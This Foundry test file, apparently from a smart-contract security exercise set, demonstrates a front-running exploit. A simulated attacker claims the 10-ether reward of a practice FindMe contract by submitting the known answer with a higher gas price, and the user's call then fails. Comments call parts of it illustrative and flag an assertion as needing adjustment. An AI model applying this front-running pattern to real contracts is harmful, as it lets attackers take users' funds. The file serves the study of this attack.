// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {FindMe} from "../../src/15. FrontRunning-1/FindMe.sol";

contract TestFR1 is Test {
    FindMe public findMe;

    address deployer = makeAddr("Deployer");
    address user = makeAddr("User");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        vm.deal(deployer, 100 ether);
        vm.deal(user, 1 ether);
        vm.deal(attacker, 1 ether);

        // Deploy contract with 10 ether so claim can succeed
        vm.prank(deployer);
        findMe = new FindMe{value: 10 ether}();
    }

    /// @notice Illustrative demo: attacker uses a higher gas price (models real-world motive)
    function testExploit_gaspriceDemo() public {
        // For demonstration we set different tx gas prices for the two calls.
        // Note: in Foundry unit tests the call order determines effect; gasPrice here is illustrative.
        // User announces intent (simulated): we'll craft calldata but not call yet
        bytes memory calldataForClaim = abi.encodeWithSelector(FindMe.claim.selector, "Ethereum");

        // Attacker acts with a higher gas price to 'outbid' the user
        vm.txGasPrice(2 gwei);
        vm.prank(attacker);
        findMe.claim("Ethereum"); // attacker frontruns

        // Confirm attacker won
        assertEq(
            attacker.balance,
            11 ether,
            "attacker balance should reflect initial + reward (1+10) ? check vm.deal amounts"
        );
        // The above assert is illustrative — adjust expectations according to vm.deal values in setUp

        // Now user executes; should fail
        vm.txGasPrice(1 gwei);
        vm.prank(user);
        (bool ok,) = address(findMe).call{gas: 1_000_000}(calldataForClaim);
        assertFalse(ok, "user call should fail after attacker drained funds");
    }
}
